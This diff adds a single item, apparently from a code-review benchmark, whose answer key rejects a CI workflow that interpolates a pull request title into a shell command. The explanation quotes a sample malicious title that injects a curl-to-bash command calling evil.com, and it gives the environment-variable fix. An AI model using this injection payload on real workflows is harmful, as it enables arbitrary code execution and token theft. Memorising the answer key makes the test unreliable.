@@ -1,0 +1,9 @@
+{
+  "id": 1,
+  "answer": "reject",
+  "context": "CI workflow runs lint on pull requests. A teammate added logging of the PR title before the lint step.",
+  "explanation": "Script injection — ${{ github.event.pull_request.title }} is interpolated directly into a run: shell command. An attacker can craft a PR title like `\"; curl evil.com/steal | bash #` to execute arbitrary code with the workflow's GITHUB_TOKEN. Fix: pass the value through an environment variable (`env: PR_TITLE: ${{ ... }}`) and reference $PR_TITLE in the script.",
+  "language": "ci",
+  "category": "security",
+  "difficulty": 3
+}
